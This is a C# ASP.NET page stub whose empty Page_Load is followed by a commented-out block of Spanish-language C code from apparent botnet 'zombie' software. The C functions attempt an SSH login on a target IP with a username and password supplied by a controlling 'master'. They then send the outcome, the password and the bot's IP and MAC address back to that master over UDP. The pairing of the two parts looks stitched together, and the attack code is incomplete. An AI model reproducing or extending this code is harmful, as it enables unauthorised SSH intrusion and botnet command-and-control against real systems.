using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;

namespace z500
{
    public partial class z500_SSH : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {

        }
    }
}
/*
void *realizarAtaqueSSH(void *mensaje){
	struct spell_msj msj = *(struct spell_msj *) mensaje;
	pthread_mutex_lock(&candadoSSH);		
		inSSHAtack = 1;
		usuario = NULL; // "prueba1"; // Usuario a utilizar (xNom)
		usuario = (char *)malloc(tamInfo_Nom);
		sprintf(usuario, "%s",  (&msj) -> xNom);
		pass = NULL; // "123456"; // Contraseña a utilizar (comserv)
		pass = (char *)malloc(tamInfo_Comserv);
		sprintf(pass, "%s", (&msj) -> comserv);
		ip = NULL; // "190.190.190.190"; // IP a utilizar (datos)
		ip = (char *)malloc(NI_MAXHOST);
		sprintf(ip, "%s", (&msj) -> datos);
		//*
		printf("==================================================\n");
			printf("	Para ataque SSH.\n");
			printf("	Dir.IP.Objetivo: %s\n", ip);
			printf("	Usuario objetivo: %s\n", usuario);
			printf("	Contraseña a usar: %s\n", pass);
		printf("==================================================\n");

		char restt[100];		
		if(intentoSSH(22) != 0){
			// Ataque SSH Fracaso
			sprintf(restt, "Fracaso para: %s", msj.datos);
			resultadoSSH(msj, restt);
			//resultadoSSH(msj, ("Fracaso para: %s",msj.datos));
		}else{
			// Ataque SSH Exitoso	
			sprintf(restt, "Éxito para: %s", msj.datos);
			resultadoSSH(msj, restt);		
			//resultadoSSH(msj, ("Éxito para: %s",msj.datos));
		}	
		inSSHAtack = 0;
	pthread_mutex_unlock(&candadoSSH);
}

void resultadoSSH(struct spell_msj mensaje, char *resultado){
	int socket_descriptor;
	int on = 1;
	
	//Inicia la estructura de direcciones de socket para los protocolos
	struct sockaddr_in address;
	memset(&(address.sin_zero), '\0', 8);
	address.sin_family = AF_INET;
	address.sin_addr.s_addr = inet_addr(inet_ntoa(mensaje.zIP)); //address.sin_addr.s_addr = inet_addr("255.255.255.255");
	address.sin_port = htons(PORT_Listen); // Puerto por donde escucha el maestro, (Entrada para el maestro)
	
	//Crear socket UDP
	socket_descriptor = socket(AF_INET, SOCK_DGRAM, 0);
    if (setsockopt(socket_descriptor, SOL_SOCKET, SO_BROADCAST, &on, sizeof(on)) < 0){
		printf("Error al crear el Socket para responder al maestro.\n");
	}else{
		//Estructurando respuesta para el maestro
		mensaje.orden = 12; // <<<-------------------------- Orden o tipo de respuesta para el maestro
		mensaje.xIP.s_addr = inet_addr(inet_ntoa(myDirIP));
		int iax;

		// Direccion MAC del Zombie ---------
    	for(iax = 0; iax < tamDirMAC; iax++){
    		mensaje.xMAC[iax] = myDirMac[iax];
	    }
	    
	    // Estado del Zombie --------------------
	    for(iax = 0; iax < tamInfo_Datos; iax++){
	    	mensaje.datos[iax] = 0;
	    }
	    sprintf(mensaje.datos, "%s", resultado);

	    for(iax = 0; iax < tamInfo_Comserv; iax++){
	    	mensaje.comserv[iax] = 0;
	    }
	    sprintf(mensaje.comserv, "%s", pass);
		
		printfStruct_SpellMsj(mensaje);
		//Respondiendo al maestro
		if (sendto(socket_descriptor, &mensaje, sizeof(mensaje), 0, (struct sockaddr *) &address, sizeof(address)) == -1){
			printf("Error al responder al maestro.\n"); // Si algo salio mal al enviar el mensaje
		}else{
			close(socket_descriptor);
		}
	}
}
*/